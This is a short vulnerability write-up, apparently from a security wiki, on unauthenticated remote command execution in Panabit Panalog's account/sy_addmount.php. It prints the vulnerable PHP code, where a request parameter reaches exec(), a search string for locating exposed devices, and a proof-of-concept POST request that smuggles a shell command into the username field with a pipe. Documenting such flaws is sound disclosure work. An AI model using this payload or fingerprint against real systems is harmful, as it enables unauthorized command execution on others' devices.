# Panabit Panalog sy_addmount.php Remote command execution vulnerability

## Vulnerability Description

Panabit Panalog sy_addmount.php is insufficient filtering, resulting in remote command execution vulnerability

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Panabit Panalog</span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">body="Maintain/cloud_index.php"</span>

## Vulnerability reappears

Login page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1628866447890-ec66a2c3-2dab-4500-a9a8-a68823931f3c.png)

The code with vulnerability is **account/sy_addmount.php**

```bash
<?php

include(dirname(__FILE__)."/../common.php");

$username = isset($_REQUEST["username"]) ? $_REQUEST["username"] : "";
if (empty($username)) {
	echo '{"success":"no", "out":"NO_USER"}';
	exit;
}

$username = addslashes($username);

$rows = array();

$cmd = PANALOGEYE." behavior add account=$username";
exec($cmd, $out, $ret);
echo $out[0];
exit;
```

There is no authentication of the identity, and the username is controllable, so the POC is constructed

```bash
POST /account/sy_addmount.php

username=|id
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1678237279001-8e9ce97e-d0d5-44c0-b2b1-e1e9550c6e3a.png)